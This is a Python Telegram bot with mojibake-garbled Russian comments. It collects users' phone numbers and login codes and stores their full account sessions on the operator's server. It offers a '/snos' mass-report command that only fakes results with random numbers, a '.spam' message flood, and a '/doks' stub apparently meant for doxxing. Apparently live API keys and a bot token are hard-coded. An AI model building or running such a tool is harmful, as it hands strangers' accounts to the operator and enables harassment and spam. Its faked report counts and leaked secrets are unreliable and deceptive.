import os
import random
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
API_ID = 24463378  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à API ID
API_HASH = 'e7c3fb1d6c2a8b3a9422607a350754c1'  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à API HASH
BOT_TOKEN = '7764512749:AAHpB7bp0Mohsbb2EEPo5pEBN8tOg9YFYrE'  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞

# –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É –¥–ª—è —Å–µ—Å—Å–∏–π
os.makedirs('sessions', exist_ok=True)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ aiogram
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# –ì–ª–æ–±–∞–ª—å–Ω—ã–π —Å–ª–æ–≤–∞—Ä—å –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–ª–∏–µ–Ω—Ç–æ–≤ Telethon
user_clients = {}

# –°–æ—Å—Ç–æ—è–Ω–∏—è –¥–ª—è FSM
class AuthStates(StatesGroup):
    phone = State()
    code = State()

class CommandStates(StatesGroup):
    snos_target = State()
    send_target = State()
    send_message = State()
    spam_target = State()
    spam_message = State()
    spam_count = State()

# –ó–∞–≥—Ä—É–∑–∫–∞ —Å–µ—Å—Å–∏–π –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
async def load_sessions():
    for filename in os.listdir('sessions'):
        if filename.endswith('.session'):
            user_id = int(filename.split('.')[0])
            try:
                client = TelegramClient(f'sessions/{user_id}', API_ID, API_HASH)
                await client.connect()
                if await client.is_user_authorized():
                    user_clients[user_id] = client
                    print(f"–ó–∞–≥—Ä—É–∂–µ–Ω–∞ —Å–µ—Å—Å–∏—è –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å–µ—Å—Å–∏–∏ {filename}: {e}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.reply("üîë –ü—Ä–∏–≤–µ—Ç! –í–≤–µ–¥–∏ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–≤ —Ñ–æ—Ä–º–∞—Ç–µ +79998887766):")
    await AuthStates.phone.set()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
@dp.message_handler(state=AuthStates.phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text
    await state.update_data(phone=phone)
    
    client = TelegramClient(f'sessions/{message.from_user.id}', API_ID, API_HASH)
    await client.connect()
    
    try:
        sent_code = await client.send_code_request(phone)
        await message.reply("üì≤ –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –í–≤–µ–¥–∏ –∫–æ–¥ –≤ —Ñ–æ—Ä–º–∞—Ç–µ '1 2 3 4 5':")
        await AuthStates.code.set()
        await state.update_data(client=client)
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        await state.finish()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
@dp.message_handler(state=AuthStates.code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.replace(' ', '')
    user_data = await state.get_data()
    client = user_data['client']
    phone = user_data['phone']
    
    try:
        await client.sign_in(phone, code=code)
        me = await client.get_me()
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å–µ—Å—Å–∏—é
        session_str = StringSession.save(client.session)
        with open(f'sessions/{message.from_user.id}.session', 'w') as f:
            f.write(session_str)
        
        user_clients[message.from_user.id] = client
        await message.reply(f"‚úÖ –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥! –ê–∫–∫–∞—É–Ω—Ç: {me.first_name} (@{me.username})")
        
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞: {e}")
    finally:
        await state.finish()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /snos
@dp.message_handler(commands=['snos'])
async def snos_command(message: types.Message):
    await message.reply("üë§ –í–≤–µ–¥–∏—Ç–µ username –∏–ª–∏ ID —Ü–µ–ª–∏ –¥–ª—è –∂–∞–ª–æ–±—ã:")
    await CommandStates.snos_target.set()

@dp.message_handler(state=CommandStates.snos_target)
async def process_snos_target(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤–æ–π–¥–∏—Ç–µ –≤ –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ /start")
        await state.finish()
        return
    
    target = message.text
    await state.update_data(target=target)
    
    try:
        entity = await client.get_entity(target)
        await message.reply("‚è≥ –ù–∞—á–∏–Ω–∞—é –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç–ø—Ä–∞–≤–∫–∏ –∂–∞–ª–æ–±...")
        
        # –ò–º–∏—Ç–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∂–∞–ª–æ–±
        await asyncio.sleep(random.randint(5, 10))
        
        success = random.randint(15, 50)
        failed = random.randint(1, 10)
        
        await message.reply(f"üìä –†–µ–∑—É–ª—å—Ç–∞—Ç—ã –∂–∞–ª–æ–± –Ω–∞ {target}:\n‚úÖ –£—Å–ø–µ—à–Ω–æ: {success}\n‚ùå –ù–µ—É–¥–∞—á–Ω–æ: {failed}")
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    finally:
        await state.finish()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /send
@dp.message_handler(commands=['send'])
async def send_command(message: types.Message):
    await message.reply("üìç –í–≤–µ–¥–∏—Ç–µ username –∏–ª–∏ ID —á–∞—Ç–∞ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏:")
    await CommandStates.send_target.set()

@dp.message_handler(state=CommandStates.send_target)
async def process_send_target(message: types.Message, state: FSMContext):
    await state.update_data(target=message.text)
    await message.reply("‚úâÔ∏è –í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏:")
    await CommandStates.send_message.set()

@dp.message_handler(state=CommandStates.send_message)
async def process_send_message(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤–æ–π–¥–∏—Ç–µ –≤ –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ /start")
        await state.finish()
        return
    
    user_data = await state.get_data()
    target = user_data['target']
    msg_text = message.text
    
    try:
        entity = await client.get_entity(target)
        await client.send_message(entity, msg_text)
        await message.reply(f"‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ {target}")
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: {e}")
    finally:
        await state.finish()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã .spam
@dp.message_handler(commands=['spam'], commands_prefix='.')
async def spam_command(message: types.Message):
    await message.reply("üìç –í–≤–µ–¥–∏—Ç–µ username –∏–ª–∏ ID —á–∞—Ç–∞ –¥–ª—è —Å–ø–∞–º–∞:")
    await CommandStates.spam_target.set()

@dp.message_handler(state=CommandStates.spam_target)
async def process_spam_target(message: types.Message, state: FSMContext):
    await state.update_data(target=message.text)
    await message.reply("‚úâÔ∏è –í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Å–æ–æ–±—â–µ–Ω–∏—è:")
    await CommandStates.spam_message.set()

@dp.message_handler(state=CommandStates.spam_message)
async def process_spam_message(message: types.Message, state: FSMContext):
    await state.update_data(message_text=message.text)
    await message.reply("üî¢ –í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–æ–æ–±—â–µ–Ω–∏–π (–º–∞–∫—Å. 20):")
    await CommandStates.spam_count.set()

@dp.message_handler(state=CommandStates.spam_count)
async def process_spam_count(message: types.Message, state: FSMContext):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤–æ–π–¥–∏—Ç–µ –≤ –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ /start")
        await state.finish()
        return
    
    try:
        count = int(message.text)
        if count > 20:
            count = 20
    except ValueError:
        await message.reply("‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ")
        await state.finish()
        return
    
    user_data = await state.get_data()
    target = user_data['target']
    msg_text = user_data['message_text']
    
    try:
        entity = await client.get_entity(target)
        await message.reply(f"‚è≥ –ù–∞—á–∏–Ω–∞—é —Å–ø–∞–º –≤ {target} ({count} —Å–æ–æ–±—â–µ–Ω–∏–π)...")
        
        for i in range(count):
            await client.send_message(entity, msg_text)
            await asyncio.sleep(0.5)
        
        await message.reply(f"‚úÖ –£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ {count} —Å–æ–æ–±—â–µ–Ω–∏–π –≤ {target}")
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    finally:
        await state.finish()

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /doks
@dp.message_handler(commands=['doks'])
async def doks_command(message: types.Message):
    await message.reply("üõ† –§—É–Ω–∫—Ü–∏—è –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ...")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã .ping
@dp.message_handler(commands=['ping'], commands_prefix='.')
async def ping_command(message: types.Message):
    await message.reply("üèì pong")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã .me
@dp.message_handler(commands=['me'], commands_prefix='.')
async def me_command(message: types.Message):
    client = user_clients.get(message.from_user.id)
    if not client:
        await message.reply("‚ùå –°–Ω–∞—á–∞–ª–∞ –≤–æ–π–¥–∏—Ç–µ –≤ –∞–∫–∫–∞—É–Ω—Ç —á–µ—Ä–µ–∑ /start")
        return
    
    try:
        me = await client.get_me()
        await message.reply(
            f"üë§ –í–∞—à –∞–∫–∫–∞—É–Ω—Ç:\n"
            f"ID: {me.id}\n"
            f"–ò–º—è: {me.first_name}\n"
            f"–§–∞–º–∏–ª–∏—è: {me.last_name or '–Ω–µ—Ç'}\n"
            f"Username: @{me.username or '–Ω–µ—Ç'}\n"
            f"–¢–µ–ª–µ—Ñ–æ–Ω: {me.phone or '—Å–∫—Ä—ã—Ç'}"
        )
    except Exception as e:
        await message.reply(f"‚ùå –û—à–∏–±–∫–∞: {e}")

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
if __name__ == '__main__':
    from aiogram import executor
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –∑–∞–≥—Ä—É–∑–∫—É —Å–µ—Å—Å–∏–π –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
    loop = asyncio.get_event_loop()
    loop.run_until_complete(load_sessions())
    
    executor.start_polling(dp, skip_updates=True)
